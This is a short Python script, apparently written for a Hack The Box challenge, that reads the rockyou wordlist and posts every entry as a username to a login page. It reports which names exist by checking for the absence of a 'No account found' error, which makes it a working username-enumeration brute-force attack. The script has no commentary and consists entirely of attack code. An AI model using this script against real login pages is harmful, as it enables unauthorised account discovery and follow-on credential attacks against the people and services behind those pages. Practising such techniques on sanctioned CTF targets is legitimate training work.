import requests

url = 'http://docker.hackthebox.eu:32032/administrat/index.php'

file = open("/home/rbus/bioh/rockyou.txt",'r').readlines()

for f in file:
	f = f.strip("\n")
	params = { 'username':f,
		'password':'tupadre'
	}

	t = requests.post(url=url,data=params)
	if "No account found with that username" not in t.text:
		print("user encontrado" + f )
